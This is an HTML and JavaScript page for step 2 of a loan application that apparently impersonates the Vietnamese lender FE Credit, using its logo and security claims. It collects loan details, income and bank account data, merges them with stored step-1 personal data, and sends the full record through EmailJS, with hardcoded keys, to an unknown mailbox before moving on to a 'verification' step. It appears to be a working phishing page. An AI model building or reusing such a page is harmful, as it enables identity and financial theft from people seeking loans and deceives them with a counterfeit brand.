<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>FE Credit - Bước 2: Thông tin khoản vay</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --primary-color: #00994F;
            --text-color: #292929;
            --bg-light: #f8f9fa;
        }
        body { font-family: 'Be Vietnam Pro', sans-serif; background-color: var(--bg-light); color: var(--text-color); }
        
        /* Header */
        #site-header { background: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.05); padding: 10px 0; }
        
        /* Progress Steps */
        .steps { display: flex; justify-content: space-between; margin: 30px auto; max-width: 800px; position: relative; padding: 0 15px; }
        .step { flex: 1; text-align: center; font-size: 13px; font-weight: 600; color: #999; position: relative; z-index: 1; }
        .step.active { color: var(--primary-color); }
        .step.completed { color: var(--primary-color); }
        .step.active::after { content: ''; position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%); width: 100%; height: 3px; background: var(--primary-color); }
        
        /* Container */
        .main-container { max-width: 800px; margin: 0 auto 50px; background: #fff; padding: 30px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
        
        /* Form Elements */
        .form-section-title { color: var(--primary-color); font-weight: 700; margin-bottom: 20px; font-size: 18px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
        .form-label { font-weight: 600; font-size: 14px; }
        .form-control, .form-select { padding: 12px; border-radius: 8px; border: 1px solid #ddd; font-size: 15px; }
        .form-control:focus, .form-select:focus { border-color: var(--primary-color); box-shadow: 0 0 0 3px rgba(0, 153, 79, 0.1); }
        
        /* Loan Calculator Box */
        .loan-calc-box { background: #e8f5e9; padding: 20px; border-radius: 12px; margin-top: 20px; border: 1px solid #c8e6c9; }
        .calc-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; }
        .calc-row.total { font-weight: 700; color: var(--primary-color); font-size: 16px; border-top: 1px dashed #aaa; padding-top: 10px; margin-top: 10px; }
        
        /* Buttons */
        .btn-next { width: 100%; background: linear-gradient(135deg, #00994F 0%, #00b359 100%); border: none; padding: 15px; font-weight: 700; border-radius: 10px; color: white; margin-top: 20px; }
        .btn-next:hover { background: #007a3f; color: white; }
        
        /* Loading */
        #loadingModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999; justify-content: center; align-items: center; }
    </style>
</head>
<body>

    <header id="site-header">
        <div class="container">
            <div id="logo" style="width: 150px;">
                <a href="index.html"><img src="https://www-cdn.fecredit.com.vn/media/20ymppzv/fec-logo.svg" alt="FE CREDIT" style="width:100%"></a>
            </div>
        </div>
    </header>

    <div class="steps">
        <div class="step completed">✓ THÔNG TIN</div>
        <div class="step active">2. KHOẢN VAY</div>
        <div class="step">3. XÁC THỰC</div>
    </div>

    <div class="container">
        <div class="main-container">
            <form id="loanForm" onsubmit="return false;">
                
                <h3 class="form-section-title"><i class="fas fa-coins me-2"></i>THÔNG TIN KHOẢN VAY</h3>
                
                <div class="row g-3">
                    <div class="col-md-6">
                        <label class="form-label">Số tiền muốn vay *</label>
                        <select class="form-select" id="loanAmount" required>
                            <option value="">Chọn số tiền</option>
                            <option value="10000000">10.000.000 VNĐ</option>
                            <option value="20000000">20.000.000 VNĐ</option>
                            <option value="30000000">30.000.000 VNĐ</option>
                            <option value="40000000">40.000.000 VNĐ</option>
                            <option value="50000000">50.000.000 VNĐ</option>
                            <option value="70000000">70.000.000 VNĐ</option>
                            <option value="100000000">100.000.000 VNĐ</option>
                        </select>
                    </div>
                    
                    <div class="col-md-6">
                        <label class="form-label">Thời hạn vay *</label>
                        <select class="form-select" id="loanTerm" required>
                            <option value="12">12 Tháng</option>
                            <option value="18">18 Tháng</option>
                            <option value="24">24 Tháng</option>
                            <option value="36">36 Tháng</option>
                            <option value="48">48 Tháng</option>
                        </select>
                    </div>

                    <div class="col-md-6">
                        <label class="form-label">Mục đích vay</label>
                        <select class="form-select" id="purpose">
                            <option value="Tiêu dùng">Tiêu dùng cá nhân</option>
                            <option value="Mua xe">Mua xe</option>
                            <option value="Sửa nhà">Sửa chữa nhà cửa</option>
                            <option value="Kinh doanh">Kinh doanh nhỏ</option>
                        </select>
                    </div>

                    <div class="col-md-6">
                        <label class="form-label">Thu nhập hàng tháng *</label>
                        <input type="text" class="form-control" id="monthlyIncome" placeholder="Nhập số tiền (VD: 10.000.000)" required>
                    </div>
                </div>

                <div class="loan-calc-box">
                    <div class="calc-row">
                        <span>Lãi suất ước tính:</span>
                        <span class="fw-bold">1.67% / tháng</span>
                    </div>
                    <div class="calc-row">
                        <span>Gốc + Lãi hàng tháng:</span>
                        <span class="fw-bold" id="monthlyPaymentDisplay">0 VNĐ</span>
                    </div>
                    <div class="calc-row total">
                        <span>Tổng tiền phải trả:</span>
                        <span id="totalPaymentDisplay">0 VNĐ</span>
                    </div>
                    <small class="text-muted d-block mt-2 fst-italic">* Số liệu mang tính chất tham khảo, lãi suất thực tế phụ thuộc vào hồ sơ.</small>
                </div>

                <h3 class="form-section-title mt-4"><i class="fas fa-university me-2"></i>TÀI KHOẢN GIẢI NGÂN</h3>
                
                <div class="row g-3">
                    <div class="col-md-12">
                        <label class="form-label">Ngân hàng thụ hưởng *</label>
                        <select class="form-select" id="bankName" required>
                            <option value="">Chọn ngân hàng</option>
                            <option value="Vietcombank">Vietcombank</option>
                            <option value="VietinBank">VietinBank</option>
                            <option value="BIDV">BIDV</option>
                            <option value="Agribank">Agribank</option>
                            <option value="Techcombank">Techcombank</option>
                            <option value="VPBank">VPBank</option>
                            <option value="MBBank">MBBank</option>
                            <option value="ACB">ACB</option>
                            <option value="Sacombank">Sacombank</option>
                            </select>
                    </div>
                    <div class="col-md-12">
                        <label class="form-label">Số tài khoản *</label>
                        <input type="text" class="form-control" id="accountNumber" placeholder="Nhập số tài khoản" required>
                    </div>
                    <div class="col-md-12">
                        <label class="form-label">Tên chủ tài khoản *</label>
                        <input type="text" class="form-control" id="accountName" placeholder="NGUYEN VAN A" required style="text-transform: uppercase;">
                        <small class="text-danger" style="font-size: 12px;">* Phải trùng với tên đăng ký ở Bước 1</small>
                    </div>
                </div>

                <button type="button" onclick="finishStep2()" class="btn btn-next" id="btnSubmit">
                    XÁC NHẬN & TIẾP TỤC <i class="fas fa-arrow-right ms-2"></i>
                </button>

            </form>
        </div>
    </div>

    <div id="loadingModal">
        <div class="bg-white p-4 rounded-3 text-center" style="width: 300px;">
            <div class="spinner-border text-success mb-3" role="status"></div>
            <h5 class="mb-2">Đang xử lý hồ sơ...</h5>
            <p class="text-muted small mb-0">Đang chuyển sang bước xác thực</p>
        </div>
    </div>

    <footer class="text-center py-4 bg-white border-top">
        <p class="small text-muted mb-0">© 2024 FE Credit. Bảo mật tuyệt đối.</p>
    </footer>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

    <script>
        // --- CONFIG ---
        const EMAIL_CONFIG = {
            publicKey: 'J4YH-lyfEfxXeu7aV',
            serviceId: 'service_60tgxof',
            templateId: 'template_oorgiah'
        };
        const SECRET_KEY = 'fecredit-secret-key';

        (function() { emailjs.init(EMAIL_CONFIG.publicKey); })();

        // --- UTILS ---
        function loadUserData() {
            const encrypted = localStorage.getItem('userData');
            if (!encrypted) return null;
            try { return JSON.parse(CryptoJS.AES.decrypt(encrypted, SECRET_KEY).toString(CryptoJS.enc.Utf8)); } catch (e) { return null; }
        }

        function saveUserData(data) {
            try {
                let existingData = loadUserData() || {};
                // Merge data cũ (step 1) với data mới (step 2)
                const newData = { ...existingData, ...data, lastStep: 2, timestamp: new Date().toISOString() };
                const encrypted = CryptoJS.AES.encrypt(JSON.stringify(newData), SECRET_KEY).toString();
                localStorage.setItem('userData', encrypted);
            } catch (e) { console.error("Lỗi lưu data", e); }
        }

        function formatCurrency(amount) {
            return new Intl.NumberFormat('vi-VN', { style: 'currency', currency: 'VND' }).format(amount);
        }

        // --- LOGIC TÍNH KHOẢN VAY (PMT Formula) ---
        function calculateLoan() {
            const amount = parseInt($('#loanAmount').val()) || 0;
            const months = parseInt($('#loanTerm').val()) || 12;
            
            if (amount === 0) {
                $('#monthlyPaymentDisplay').text('0 VNĐ');
                $('#totalPaymentDisplay').text('0 VNĐ');
                return;
            }

            // Giả lập lãi suất 1.67% tháng (~20%/năm)
            const monthlyRate = 0.0167; 
            
            // Công thức: M = P * r * (1+r)^n / ((1+r)^n - 1)
            const monthlyPayment = amount * monthlyRate * (Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, months) - 1);
            const totalPayment = monthlyPayment * months;

            $('#monthlyPaymentDisplay').text(formatCurrency(monthlyPayment));
            $('#totalPaymentDisplay').text(formatCurrency(totalPayment));
        }

        // --- MAIN ---
        $(document).ready(function() {
            // 1. Bảo vệ luồng: Nếu chưa làm bước 1 -> Đá về bước 1
            const step1Data = loadUserData();
            if (!step1Data || !step1Data.fullName) {
                alert("Vui lòng điền thông tin cá nhân trước!");
                window.location.href = 'step1.html';
                return;
            }

            // 2. Masking tiền tệ
            $('#monthlyIncome').mask('000.000.000.000', {reverse: true});

            // 3. Lắng nghe sự kiện để tính toán
            $('#loanAmount, #loanTerm').on('change', calculateLoan);

            // 4. Tự điền tên chủ tài khoản theo Step 1
            if(step1Data.fullName) {
                $('#accountName').val(step1Data.fullName); // Gợi ý tên
            }
        });

        // --- SUBMIT FUNCTION ---
        async function finishStep2() {
            // Validate form
            if (!$('#loanAmount').val() || !$('#bankName').val() || !$('#accountNumber').val() || !$('#monthlyIncome').val()) {
                alert("Vui lòng điền đầy đủ thông tin khoản vay và ngân hàng.");
                return;
            }

            // 1. Thu thập dữ liệu
            const step2Data = {
                loan_amount: $('#loanAmount option:selected').text(),
                loan_term: $('#loanTerm option:selected').text(),
                loan_purpose: $('#purpose').val(),
                monthly_income: $('#monthlyIncome').val(),
                bank_name: $('#bankName').val(),
                bank_account_num: $('#accountNumber').val(),
                bank_account_name: $('#accountName').val(),
                step: "HOÀN THÀNH BƯỚC 2"
            };

            // 2. Hiệu ứng Loading
            $('#btnSubmit').prop('disabled', true);
            $('#loadingModal').css('display', 'flex').hide().fadeIn();

            // 3. Lưu vào LocalStorage (Merge với Step 1)
            saveUserData(step2Data);

            // 4. Lấy toàn bộ data (đã merge) để gửi Email
            const fullData = loadUserData();

            // 5. Gửi EmailJS
            try {
                await emailjs.send(
                    EMAIL_CONFIG.serviceId,
                    EMAIL_CONFIG.templateId,
                    fullData // Gửi object chứa cả tên, sđt (step1) và khoản vay (step2)
                );
                console.log("Email sent step 2!");
            } catch (error) {
                console.error("Email error", error);
            }

            // 6. Chuyển trang
            setTimeout(() => {
                window.location.href = 'step3.html';
            }, 1500);
        }
    </script>
</body>
</html>
